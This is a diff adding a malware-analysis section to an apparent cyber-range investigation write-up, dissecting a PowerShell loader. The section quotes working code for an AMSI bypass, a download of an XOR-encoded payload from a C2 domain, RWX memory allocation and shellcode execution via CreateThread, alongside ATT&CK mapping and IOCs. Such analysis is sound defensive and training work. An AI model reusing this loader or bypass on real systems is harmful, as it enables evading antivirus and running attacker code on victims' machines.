@@ -138,7 +138,179 @@ WindowsProcess_CL
 
 **Evidence Sources:** LAW-Cyber-Range (Azure management logs) + LAW-SilentCorridor (Windows process telemetry)
 
+---
+## C03 — Payload Execution Analysis
 
+![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
+![Analysis](https://img.shields.io/badge/Analysis-Malware%20Reverse%20Engineering-red)
+![Tools](https://img.shields.io/badge/Tools-PowerShell%20%7C%20Hex%20Analysis-blue)
+
+> [!NOTE]
+> **Operational Security:** Evidence contained live malware. I created an isolated VM in the Log(N)Pacific cyber range, RDP'd from my Mac, extracted & analyzed in sandbox, then deleted the VM. No malware on personal systems.
+
+---
+
+### Execution Flow
+
+```mermaid
+graph TD
+    A["loader.ps1 Executes"] --> B["Step 1: AMSI Bypass"]
+    B --> C["Step 2: Download Shellcode"]
+    C --> D["Step 3: XOR Decrypt"]
+    D --> E["Step 4: Allocate Memory"]
+    E --> F["Step 5: Inject Shellcode"]
+    F --> G["Step 6: Execute via Thread"]
+```
+
+---
+
+### What I Found
+
+**File:** loader.ps1 (928 bytes)  
+**SHA-256:** 93164086788a0a8b5a16816922b631ff191ba1bdb5fd83cf25349ddc03af7583
+
+The script does six things in sequence. Here's what each step does:
+
+---
+
+<details>
+<summary><b>Step 1: AMSI Bypass</b> — Disable Windows Defender Detection</summary>
+
+```powershell
+$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+**What it does:** Uses .NET reflection to access the AMSI (Antimalware Scan Interface) framework and sets a flag that tells Windows "scanning failed, stop trying." This prevents Defender from analyzing the next PowerShell commands.
+
+**Why:** Gives the attacker free rein to execute arbitrary commands without real-time detection.
+
+</details>
+
+---
+
+<details>
+<summary><b>Step 2: Fetch Encoded Payload</b> — Download from attacker server</summary>
+
+```powershell
+$url = 'https://cdn.cloud-endpoint.net/update'
+$enc = (New-Object System.Net.WebClient).DownloadData($url)
+```
+
+**What it does:** Creates a WebClient and downloads binary data from the attacker's C2 server. The data is encoded (not raw shellcode yet).
+
+**Why:** Keeps the actual malicious code off-disk. It only exists in memory during execution.
+
+</details>
+
+---
+
+<details>
+<summary><b>Step 3: Decode Payload</b> — XOR decryption</summary>
+
+```powershell
+$key = 0x4A
+$sc = [byte[]]($enc | ForEach-Object { $_ -bxor $key })
+```
+
+**What it does:** Takes each byte from the downloaded data and XORs it with 0x4A. XOR is a simple cipher — reversible if you know the key.
+
+**Why:** Makes the payload harder to detect via static signature analysis. Defenders scanning network traffic would see gibberish, not recognizable malware patterns.
+
+</details>
+
+---
+
+<details>
+<summary><b>Step 4: Allocate Executable Memory</b> — VirtualAlloc</summary>
+
+```powershell
+Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);...' -Name K -Namespace W
+$mem = [W.K]::VirtualAlloc([IntPtr]::Zero,[uint32]$sc.Length,0x3000,0x40)
+```
+
+**What it does:** Calls the Windows kernel directly (P/Invoke) to request a memory region. Flags used:
+- `0x3000` = MEM_COMMIT | MEM_RESERVE (allocate and commit)
+- `0x40` = PAGE_EXECUTE_READWRITE (readable, writable, AND executable)
+
+**Why:** Creates a space in RAM where code can run without touching disk. This is in-memory execution — no .exe file, no detectable artifact on drive.
+
+</details>
+
+---
+
+<details>
+<summary><b>Step 5: Copy Shellcode to Memory</b> — Injection</summary>
+
+```powershell
+[Runtime.InteropServices.Marshal]::Copy($sc,0,$mem,$sc.Length)
+```
+
+**What it does:** Uses .NET's Marshal class to copy the decoded shellcode bytes into the allocated memory region.
+
+**Why:** Moves the malicious code from the downloaded packet into the executable memory space, ready to run.
+
+</details>
+
+---
+
+<details>
+<summary><b>Step 6: Execute**</b> — CreateThread & Wait</summary>
+
+```powershell
+$t = [W.K]::CreateThread([IntPtr]::Zero,0,$mem,[IntPtr]::Zero,0,[IntPtr]::Zero)
+[W.K]::WaitForSingleObject($t,[uint32]0xFFFFFFFF)
+```
+
+**What it does:** 
+- `CreateThread` spawns a new thread starting at the shellcode address
+- `WaitForSingleObject` pauses the PowerShell script until the shellcode finishes
+
+**Why:** Executes the payload. The `0xFFFFFFFF` parameter means "wait forever" — the script doesn't exit until the shellcode is done.
+
+</details>
+
+---
+
+### MITRE ATT&CK Mapping
+
+| Tactic | Technique | ID | Evidence |
+|--------|-----------|----|----|
+| Defense Evasion | Impair Defenses (AMSI) | T1562.001 | AMSI flag set to $true |
+| Execution | Command & Scripting (PowerShell) | T1059.001 | Entire loader is PowerShell |
+| Execution | Native API | T1106 | P/Invoke: VirtualAlloc, CreateThread |
+| Defense Evasion | Obfuscated Files | T1027 | XOR encryption (key 0x4A) |
+
+---
+
+### Indicators of Compromise
+
+> [!WARNING]
+> **Alert: These IOCs match your intrusion**
+
+- **C2 Domain:** `cdn.cloud-endpoint.net/update`
+- **Script Hash:** `93164086788a0a8b5a16816922b631ff191ba1bdb5fd83cf25349ddc03af7583`
+- **Encryption Key:** `0x4A` (XOR)
+- **Memory Signature:** VirtualAlloc + PAGE_EXECUTE_READWRITE (0x40) + CreateThread pattern
+
+---
+
+### What This Tells Me About the Attacker
+
+1. **Sophisticated:** They use reflective loading and in-memory execution — avoids disk IOCs
+2. **Prepared:** Pre-encoded payload + C2 infrastructure ready
+3. **Defense-aware:** AMSI bypass shows they know Windows Defender is standard
+4. **Modular:** The loader is generic — could deploy any shellcode payload
+
+---
+
+### Questions I Still Have
+
+- What's in the shellcode? (Need DeviceEvents logs from LAW-Cyber-Range to see what actions it took)
+- Who owns `cdn.cloud-endpoint.net`? (OSINT task)
+- Was this a targeted attack or spray-and-pray campaign?
+
+These are for C04 (Impact Analysis).
 
 ---
 
